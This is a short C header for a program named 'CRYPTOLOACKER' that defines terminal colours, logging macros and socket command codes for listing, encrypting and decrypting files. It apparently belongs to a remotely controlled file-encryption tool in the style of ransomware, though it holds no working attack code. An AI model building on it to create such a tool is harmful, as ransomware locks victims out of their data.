#ifndef OPT_H
#define OPT_H

#define NAME "CRYPTOLOACKER"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_GREY    "\x1b[37m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define CMD_EXIT "EXIT"
#define CMD_LSTF "LSTF"
#define CMD_LSTR "LSTR"
#define CMD_ENCR "ENCR"
#define CMD_DECR "DECR"

#define CMD_CPH_OK 200
#define CMD_LST_OK 300
#define CMD_TRNS_NOK 400
#define CMD_NOK 500

#define std_out(arg)        fprintf(stdout, ANSI_COLOR_GREEN    "%s    "    ANSI_COLOR_GREY " > " ANSI_COLOR_RESET "%s\n", NAME, arg)
#define std_err(arg)        fprintf(stderr, ANSI_COLOR_RED      "%s    "    ANSI_COLOR_GREY " > " ANSI_COLOR_RESET "%s\n", NAME, arg)
#define std_sck(sock, arg)  fprintf(stderr, ANSI_COLOR_CYAN     "%s (%d)"   ANSI_COLOR_GREY " > " ANSI_COLOR_RESET "%s\n", NAME, sock, arg)

#endif // OPT_H
